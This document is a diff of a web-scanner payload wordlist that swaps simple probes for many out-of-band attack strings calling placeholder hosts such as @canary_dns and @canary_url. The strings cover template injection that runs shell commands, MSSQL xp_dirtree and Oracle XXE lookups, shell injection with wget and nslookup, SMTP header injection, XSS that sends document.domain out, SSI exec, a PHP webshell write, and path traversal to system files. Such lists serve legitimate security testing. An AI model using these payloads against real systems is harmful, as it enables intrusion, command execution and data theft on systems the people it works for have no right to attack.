@@ -7,20 +7,23 @@
 %
 &
 &&
-' 
+'
 '"
 ''
 '''
 ''''
 ')
+'--
 (
 )
+))))))))))
 *
 +
 ,
 ,,,,,,
 -
 -->
+..;/
 /
 //
 />
@@ -53,50 +56,190 @@ $
 $()
 $[]
 ${}
-$(/bin/sleep 5)
-${/bin/sleep 5}
-0
-%00
-00:00:10'--
-%0a%0a
+[[${77*77}]]
+${{77*77}}
+${77*77}
+${class.getClassLoader()}
+${class.getResource("").getPath()}
+${class.getResource("../../../../../WEB-INF/web.xml").getContent()}
+${''.constructor.constructor('return Error().stack')()}
+${#ctx.getClass()}
+${"freemarker.template.utility.Execute"?new()("id")}
+${"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("new java.lang.ProcessBuilder[\"(java.lang.String[])\"]([\"/bin/sh\",\"-c\",\"nslookup @canary_dns\"]).start()")}
+${''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval('new java.lang.ProcessBuilder[\'(java.lang.String[])\']([\'/bin/sh\',\'-c\',\'nslookup @canary_dns\']).start()')}
+}${"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("new java.lang.ProcessBuilder[\"(java.lang.String[])\"]([\"/bin/sh\",\"-c\",\"nslookup @canary_dns\"]).start()")}${
+}${''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval('new java.lang.ProcessBuilder[\'(java.lang.String[])\']([\'/bin/sh\',\'-c\',\'nslookup @canary_dns\']).start()')}${
+{${gethostbyname("@canary_dns")}}
+${__import__("traceback").format_stack()}
+{$smarty.version}
+${T(java.lang.System).getenv()}
+$(wget @canary_url)
+${xyz|77*77}
+%0d%0aDATA%0d%0afoo%0d%0a%2e%0d%0aMAIL+FROM:+@canary_email%0d%0aRCPT+TO:+@canary_email%0d%0aDATA%0d%0aFrom:+@canary_email%0d%0aTo:+@canary_email%0d%0aSubject:+test%0d%0afoo%0d%0a%2e%0d%0a
+'"`0&nslookup @canary_dns&`'
 -1
 1
+1;DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\@canary_dns\s');EXEC(@x)--
+1;EXEC master..xp_dirtree "\\@canary_dns\s"--
+1;EXEC master..xp_dirtree '\\@canary_dns\s'--
+%20{!xmlparser v='<!DOCTYPE a SYSTEM "@canary_urlsr"><a></a>'}%20
+#{77*77}
+<%=77*77%>
+@(77*77)
+[[77*77]]
+{{=77*77}}
+{{{77*77}}}
+{{77*77}}
+{77*77}
 a
 ><AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-admin' #
-admin' --
-admin' /*
-`/bin/sleep 5`
-() { :; }; /bin/sleep 5
-..\..\..\..\..\..\..\boot.ini
-..\..\..\..\..\..\..\boot.ini%00
-../../../../../etc/passwd
-../../../../../etc/passwd%00
-False
-i%ff
+<a>{base}</a>
+{{app.request.server.all|join(',')}}
+<#assign ex = "freemarker.template.utility.Execute"?new()>${ex("id")}
+[#assign ex = 'freemarker.template.utility.Execute'?new()]${ex('id')}
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("nslookup @canary_dns") }
+<#assign xy="zxxxxxxz"><#assign yx="zyyyyyyz">${yx}${xy}
+<a xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="@canary_urlx.xsd"><b></b></a>
+<a xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="http://@canary_url/x.xsd"><b></b></a>
+/../{base}
+/./{base}
+{base}::$DATA
+{base}%0aDATA%0afoo%0a%2e%0aMAIL+FROM:+@canary_email%0aRCPT+TO:+@canary_email%0aDATA%0aFrom:+@canary_email%0aTo:+@canary_email%0aSubject:+tst%0afoo%0a%2e%0a
+{base}%0a ping -i 30 @canary_dns %0a
+{base} a=""
+{base}" a="
+{base}' a='
+{base}& id
+{base}; id
+{base}| id
+{base}; ping -c 5 @canary_dns ;
+{base}& ping -i 30 @canary_dns &
+{base}| ping -i 30 @canary_dns |
+{base}|| ping -i 30 @canary_dns ; x || ping -n 30 @canary_dns &
+{base}& ping -n 30 @canary_dns &
+{base}| ping -n 30 @canary_dns |
+{base}","x":"
+{base}"],"x":["
+{base},"x":1
+{base}" xmlns:xsi="
+{base}' xmlns:xsi='
+{base}<!--xx-->
+../../../../../../../../../../boot.ini
+@canary_dns
+@canary_email%0aBcc:@canary_email
+@canary_email%0aCc:@canary_email
+@canary_email%0d%0aBcc:@canary_email
+@canary_email%0d%0aCc:@canary_email
+@canary_url
+<![CDATA[{base}]]>
+{{[].class.base.subclasses()}}
+{{''.class.mro()[1].subclasses()}}
+{{''.__class__.__mro__[2].__subclasses__()}}
+{{constant('Twig_Environment::VERSION')}}
+#{''.constructor.constructor('return Error().stack')()}
+<%=''.constructor.constructor('return Error().stack')()%>
+{{''.constructor.constructor('return Error().stack')()}}
+<data xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="@canary_urlxincl"></xi:include></data>
+<data xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://@canary_url/xincl"></xi:include></data>
+");DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\@canary_dns\s');EXEC(@x)--
+";DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\@canary_dns\s');EXEC(@x)--
+"='');DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\@canary_dns\s');EXEC(@x)--
+"='';DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\@canary_dns\s');EXEC(@x)--
+');DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\@canary_dns\s');EXEC(@x)--
+';DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\@canary_dns\s');EXEC(@x)--
+;DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\@canary_dns\s');EXEC(@x)--
+\";DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\@canary_dns\s');EXEC(@x)--
+\';DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\@canary_dns\s');EXEC(@x)--
+{{dump(app)}}
+;echo 111111
+echo 111111
+../../../../../../../../../../../../etc/hosts
+{{'/etc/passwd'|file_excerpt(1,30)}}
+'+eval(compile('for x in range(1):\n import socket\n socket.gethostbyname("@canary_dns")','a','single'))+'
+eval(compile('for x in range(1):\n import socket\n socket.gethostbyname("@canary_dns")','a','single'))
+"+eval("require'socket'\nSocket.gethostbyname('@canary_dns')")+"
++eval("require'socket'\nSocket.gethostbyname('@canary_dns')")+'
+eval("require'socket'\nSocket.gethostbyname('@canary_dns')")
+");EXEC master..xp_dirtree "\\@canary_dns\s"--
+";EXEC master..xp_dirtree "\\@canary_dns\s"--
+"='');EXEC master..xp_dirtree "\\@canary_dns\s"--
+"='';EXEC master..xp_dirtree "\\@canary_dns\s"--
+');EXEC master..xp_dirtree '\\@canary_dns\s'--
+';EXEC master..xp_dirtree '\\@canary_dns\s'--
+;EXEC master..xp_dirtree "\\@canary_dns\s"--
+;EXEC master..xp_dirtree '\\@canary_dns\s'--
+||extractvalue(xmltype('<!DOCTYPE root [<!ENTITY % xxx SYSTEM "@canary_urlext1">%xxx;]>'),'/l')
+'||extractvalue(xmltype('<!DOCTYPE root [<!ENTITY % xxx SYSTEM "@canary_urlext2">%xxx;]>'),'/l')||'
+||extractvalue(xmltype('<!DOCTYPE root [<!ENTITY % xxx SYSTEM "http://@canary_url/ext1">%xxx;]>'),'/l')
+'||extractvalue(xmltype('<!DOCTYPE root [<!ENTITY % xxx SYSTEM "http://@canary_url/ext2">%xxx;]>'),'/l')||'
+extractvalue(xmltype(ORACLE_ENCODE_STRING(<!DOCTYPE root [<!ENTITY % xxx SYSTEM "@canary_urlext3">%xxx;]>),ORACLE_ENCODE_STRING(/l))
+extractvalue(xmltype(ORACLE_ENCODE_STRING(<!DOCTYPE root [<!ENTITY % xxx SYSTEM "http://@canary_url/ext3">%xxx;]>),ORACLE_ENCODE_STRING(/l))
+{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='Sized'%}{{c.__len__.__globals__['__builtins__']['__import__']('traceback').format_stack()}}{%endif%}{%endfor%}
+#{"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("new java.lang.ProcessBuilder[\"(java.lang.String[])\"]([\"/bin/sh\",\"-c\",\"nslookup @canary_dns\"]).start()")}
+#{''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval('new java.lang.ProcessBuilder[\'(java.lang.String[])\']([\'/bin/sh\',\'-c\',\'nslookup @canary_dns\']).start()')}
+}#{"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("new java.lang.ProcessBuilder[\"(java.lang.String[])\"]([\"/bin/sh\",\"-c\",\"nslookup @canary_dns\"]).start()")}#{
+}#{''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval('new java.lang.ProcessBuilder[\'(java.lang.String[])\']([\'/bin/sh\',\'-c\',\'nslookup @canary_dns\']).start()')}#{
+'.gethostbyname("@canary_dns").'
+'.gethostbyname('@canary_dns').'
+gethostbyname('@canary_dns')
+http://@canary_url/
+https://@canary_dns
+`id`
+#{__import__("traceback").format_stack()}
+<%__import__("traceback").format_stack()%>
+{{__import__("traceback").format_stack()}}
 INJECT"'();</>=/*<!--#//
-%n
+javascript:/*</script><img/onerror='-/"/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/rkf9yyuox44dahzjkookgz001r7ovej6au1koaczX;.@canary_dns/).replace(/.;/g,[])]//'src=>
+ldap://@canary_dns/cn=bar,dc=test,dc=org
 nofile.php%00
-' OR 2=2 #
-' OR 2=2 --
-' OR 2=2 /*
-'+or+'a'+'a
-phpinfo();
-sleep(5)
+`nslookup @canary_dns`
+|nslookup @canary_dns&
+nslookup @canary_dns&
+&nslookup -q=cname @canary_dns&'\"`0&nslookup @canary_dns&`'
+ or chr(1)=extractvalue(xmltype(ORACLE_ENCODE_STRING(<!DOCTYPE root [<!ENTITY % xxx SYSTEM "@canary_urlext4">%xxx;]>),ORACLE_ENCODE_STRING(/l))
+ or chr(1)=extractvalue(xmltype(ORACLE_ENCODE_STRING(<!DOCTYPE root [<!ENTITY % xxx SYSTEM "http://@canary_url/ext4">%xxx;]>),ORACLE_ENCODE_STRING(/l))
+ or chr(1)=UTL_INADDR.get_host_address(ORACLE_ENCODE_STRING(@canary_dns))
+{php}echo `id`;{/php}
+`ping -c 5 @canary_dns`
+<pre>{% debug %}</pre>
+<p th:text='${#ctx.getClass()}'></p>
 '; RAISERROR (15600,-1,-1, 'test');--
-%s
-Š
-<script
-True
- UNION SELECT 1; --
- UNION SELECT 1; /*
-' UNION SELECT 1 ; --
-' UNION SELECT 1; /*
-%x
-..;/
-${self}
-{self}
-{this}
-${this}
-{{nothing}}
+"-require("child_process").exec("nslookup @canary_dns")-"
+'-require('child_process').exec('nslookup @canary_dns')-'
+<% require("child_process").exec("nslookup @canary_dns"); %>
+<% require('child_process').exec('nslookup @canary_dns'); %>
+require('child_process').exec('nslookup @canary_dns')
+:response.write 111111
+response.write 111111
+rmi://@canary_dns/go
+*/--></script></title></textarea></noscript></style></xmp></noembed></comment></noframes></xml></iframe>"'><img src="//@canary_dns/image.jpg">
+*/--></script></title></textarea></noscript></style></xmp></noembed></comment></noframes></xml></iframe>"'><script>document.write('<img src=//@canary_dns/'+document.domain+'>')</script>
+(select load_file('\\\\@canary_dns\\c'))
+'+(select load_file('\\\\@canary_dns\\e'))+'
+{{self}}
+#set($x=77*77)${x}
+"-->'-->`--><!--#set var="suc" value="rtb97y3o64"--><!--#set var="uwe" value="tvdb905q86"--><!--#echo var="suc"--><!--#echo var="uwe"--><!--#exec cmd="id" -->
+"-->'-->`--><!--#set var="suc" value="rtb97y3o64"--><!--#set var="uwe" value="tvdb905q86"--><!--#echo var="suc"--><!--#echo var="uwe"--><!--#exec cmd="nslookup @canary_dns" -->
+&shards=@canary_dns/sr
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['nslookup @canary_dns']); ?>",self::clearConfig())}
+#{Thread.current.backtrace}
+<%=Thread.current.backtrace%>
+'||Utl_Http.request('@canary_url') from dual--
+'||UTL_INADDR.get_host_address('@canary_dns')||'
+||UTL_INADDR.get_host_address('@canary_dns')
+UTL_INADDR.get_host_address(ORACLE_ENCODE_STRING(@canary_dns))
+& wget @canary_url &
+../../../../../../../../../../windows/win.ini
+..\..\..\..\..\..\..\..\..\..\..\..\windows/win.ini
+" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="@canary_urlx.xsd
+" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="http://@canary_url/x.xsd
+" {!xmlparser v='<!DOCTYPE a SYSTEM "@canary_urlsr"><a></a>'} "
+") {!xmlparser v='<!DOCTYPE a SYSTEM "@canary_urlsr"><a></a>'} ("
+<?xml version="1.0" encoding="UTF-8" standalone="no"?><!DOCTYPE a SYSTEM "@canary_urlxxx"><a></a>
+<?xml version="1.0" encoding="UTF-8" standalone="no"?><!DOCTYPE a SYSTEM "http://@canary_url/xxx"><a></a>
+<?xml version="1.0" encoding="UTF-8" standalone="no"?><!DOCTYPE x [<!ENTITY % xx SYSTEM "@canary_urlxxx">%xx;]><a></a>
+<?xml version="1.0" encoding="UTF-8" standalone="no"?><!DOCTYPE x [<!ENTITY % xx SYSTEM "http://@canary_url/xxx">%xx;]><a></a>
+xsstest
+xsstest%00"<>'
+xxx/../{base}
